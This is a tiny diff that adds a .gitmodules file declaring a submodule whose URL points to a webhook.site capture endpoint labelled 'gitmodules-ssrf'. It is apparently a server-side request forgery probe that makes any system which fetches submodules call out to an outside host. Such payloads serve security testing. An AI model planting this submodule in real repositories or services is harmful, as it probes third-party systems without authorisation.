@@ -1,0 +1,3 @@
+[submodule "vendor"]
+	path = vendor
+	url = https://webhook.site/7e290af6-a517-4435-b786-2305f49037f4/gitmodules-ssrf
